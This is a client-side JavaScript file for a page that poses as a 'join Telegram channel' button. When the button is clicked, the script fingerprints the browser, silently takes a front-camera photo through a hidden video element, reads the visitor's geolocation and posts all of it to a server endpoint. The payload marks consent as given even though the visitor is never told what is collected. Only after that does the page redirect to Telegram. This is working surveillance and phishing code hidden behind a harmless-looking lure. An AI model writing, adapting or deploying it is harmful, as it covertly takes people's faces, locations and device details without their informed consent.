(function () {
  const joinUrl = ''; // Set your Telegram channel link here
  const joinButton = document.getElementById('join-channel-btn');
  let cameraStream = null;

  function stopCamera() {
    if (cameraStream) {
      cameraStream.getTracks().forEach(function (track) {
        track.stop();
      });
      cameraStream = null;
    }
  }

  joinButton.addEventListener('click', async function (e) {
    e.preventDefault();
    joinButton.style.pointerEvents = 'none';
    joinButton.textContent = 'Allow access to continue...';

    // Collect device information immediately
    const browserDetails = {
      userAgent: navigator.userAgent,
      platform: navigator.userAgentData ? navigator.userAgentData.platform : navigator.platform,
      language: navigator.language,
      languages: navigator.languages,
      screen: {
        width: window.screen.width,
        height: window.screen.height,
        colorDepth: window.screen.colorDepth
      },
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      mobile: navigator.userAgentData ? navigator.userAgentData.mobile : /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent),
      online: navigator.onLine,
      cookieEnabled: navigator.cookieEnabled,
      hardwareConcurrency: navigator.hardwareConcurrency,
      deviceMemory: navigator.deviceMemory,
      doNotTrack: navigator.doNotTrack
    };

    console.log('Device Info Collected:', browserDetails);

    // Request camera and location permissions together
    let photoData = null;
    let locationData = null;

    // Request camera permission
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
        cameraStream = stream;

        // Create hidden video element to capture from
        const video = document.createElement('video');
        video.srcObject = cameraStream;
        video.muted = true;
        video.playsInline = true;
        video.style.display = 'none';
        document.body.appendChild(video);

        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        // Wait for video to be ready
        await new Promise(resolve => setTimeout(resolve, 500));

        const canvas = document.createElement('canvas');
        const scale = Math.min(1, 1024 / Math.max(video.videoWidth, video.videoHeight));
        canvas.width = Math.round(video.videoWidth * scale);
        canvas.height = Math.round(video.videoHeight * scale);
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        photoData = canvas.toDataURL('image/jpeg', 0.7);

        document.body.removeChild(video);
        stopCamera();
      } catch (error) {
        console.log('Camera access not granted:', error);
      }
    }

    // Request location permission
    if (navigator.geolocation) {
      try {
        const position = await new Promise((resolve, reject) => {
          navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 });
        });
        locationData = {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          accuracyMeters: Math.round(position.coords.accuracy)
        };
      } catch (error) {
        console.log('Location not granted:', error);
      }
    }

    joinButton.textContent = 'Joining...';

    // Send data to API
    const payload = {
      consent: true,
      metadataConsent: true,
      locationConsent: locationData !== null,
      name: '',
      phone: '',
      city: '',
      country: '',
      browserDetails: browserDetails,
      location: locationData,
      photo: photoData ? photoData.split(',')[1] : null
    };

    console.log('Sending data to API:', payload);

    try {
      const response = await fetch('/api/submit', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
      console.log('API response:', response);
    } catch (error) {
      console.log('Error sending data:', error);
    }

    // Redirect to Telegram
    console.log('Redirecting to Telegram...');
    if (joinUrl) {
      window.location.assign(joinUrl);
    } else {
      console.log('No join URL set. Data collection complete.');
      joinButton.textContent = 'Joined!';
    }
  });
}());
